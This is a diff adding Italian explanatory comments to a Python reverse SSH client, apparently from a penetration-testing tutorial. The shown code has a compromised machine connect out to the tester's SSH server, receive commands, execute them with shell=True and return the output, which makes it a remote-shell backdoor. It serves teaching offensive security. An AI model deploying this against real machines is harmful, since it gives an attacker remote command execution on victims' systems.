@@ -1,5 +1,22 @@
 # bhp_reverse_ssh.py
 
+# Nel codice sorgente precedente bhp_ssh.py, abbiamo visto come
+# creare un client ssh in Python che si connette ad un Server SSH
+# ed esegue il comando indicato, stampandone il risultato su
+# linea di comando prima di terminare.
+
+# Approfondiamo l'esempio precedente implementando un client SSH
+# reverse. Nella maggior parte dei casi infatti potrebbe non essere
+# presente un Server SSH sulle macchine penetrare, e la soluzione
+# e' di eseguire sulla macchina sotto attacco un client SSH che si
+# connette ad un Server SSH (in esecuzione su una nostra macchina)
+# esegue i comandi sul client, e invia gli output al Server.
+# Ricordiamoci infatti che per eseguire un Server SSH potremmo
+# aver bisogno di privilegi elevati, e non sempre e' facile
+# ottenerli durante un test di penetrazione.
+# In questo modo si esegue una connessione detta reverse, dove noi
+# fungiamo da Server e la vittima e' un client che si connette a noi.
+
 import sys
 import threading
 import paramiko
@@ -15,10 +32,13 @@ def ssh_command(ip, user, passwd, command):
 
         if ssh_session.active:
 		ssh_session.send(command)
-		print(ssh_session.recv(1024)) # read banner
+		# Lettura del banner: spesso molti Server SSH inviano un primo
+		# messaggio quando avviene la connessione, detto banner.
+		print(ssh_session.recv(1024))
 
 		while True:
-			command = ssh_session.recv(1024) # get the command from the ssh Server
+			# ricezione del comando dal Server SSH.
+			command = ssh_session.recv(1024)
 			try:
 				cmd_output = subprocess.check_output(command, shell=True)
 				ssh_session.send(cmd_output)
